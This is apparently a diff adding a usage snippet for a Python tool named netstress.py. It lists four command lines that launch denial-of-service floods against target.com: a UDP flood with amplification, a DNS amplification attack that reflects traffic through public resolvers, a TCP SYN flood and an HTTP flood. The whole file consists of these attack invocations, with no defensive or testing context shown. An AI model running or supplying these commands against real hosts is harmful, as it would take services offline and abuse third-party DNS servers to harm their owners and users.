@@ -1,0 +1,11 @@
+# UDP flood with amplification
+python netstress.py target.com 80 -t udp --amplification
+
+# DNS amplification attack
+python netstress.py target.com 53 -t dns --dns-servers 8.8.8.8 9.9.9.9
+
+# TCP SYN flood
+python netstress.py target.com 443 -t tcp -c 100
+
+# HTTP flood
+python netstress.py target.com 80 -t http
